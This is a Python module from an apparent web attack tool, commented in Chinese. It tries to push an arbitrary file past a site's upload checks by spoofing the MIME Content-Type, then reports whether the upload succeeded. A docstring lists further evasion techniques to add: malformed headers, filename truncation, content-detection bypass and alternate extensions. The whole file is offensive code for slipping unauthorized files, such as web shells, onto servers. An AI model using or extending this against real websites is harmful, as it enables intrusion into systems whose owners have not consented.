#!/usr/bin/python
# -*- coding:utf8 -*-
#author:Jinhao

import sys
import os
from comman import *
from color_output import *

"""
1，混淆header，畸形请求
2，混淆文件名，截断，换行
3，MIME
4，文件内容检测绕过
5，同义后缀名替换
...
"""
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
}

class General:
    def __init__(self, args, data, initUrls, comman, stop=True):
        '''

        :param args: args集
        :param data: 传送参数
        :param initUrls: 初始URL集
        :param comman: 通用类
        :param stop: 是否即停
        '''
        self.args = args
        self.data = data
        self.initUrls = initUrls
        self.Comman = comman
        self.stop = stop

    def exploit(self):
        '''
        尝试攻击并检查输出
        :return:
        '''
        p1 = self.mimeBypass()
        c1 = self.Comman.checkResult(self.initUrls, p1)
        if c1 == True:
            print(green('[ result ]') + cyan('成功上传'))
        return


    def fuzzHeaders(self, headers, key, value):
        # 混淆headers
        headers[key] = value
        return headers

    def mimeBypass(self, ct='image/jpg'):
        '''
        MIME绕过后端检测
        :return:
        '''
        print(blue('[ schedule ]') + cyan('利用MIME绕过测试'))
        if self.args.mime != '':
            ct = self.args.mime
        elif self.args.ct != '':
            ct = self.Comman.setContentType()
        print(blue('[ Info ]') + fuchsia('指定MIME为:') + cyan(ct))
        files = self.setFiles(self.args.field, self.args.f, ct=ct)
        res = self.Comman.upload(self.args.u, files, data=self.data)
        return res



    def setFiles(self, field, file, attachFilename='', ct='', other={}):
        # 获取文件内容
        if attachFilename == '':
            (path, filename) = os.path.split(file)
            attachFilename = filename
        try:
            files = {
                field: (
                attachFilename,
                open(file, 'rb'),
                ct,
                other
            )
            }
            # print(files)
            return files
        except:
            print(red('[ Error ]') + yellow('读取文件失败'))
            sys.exit()

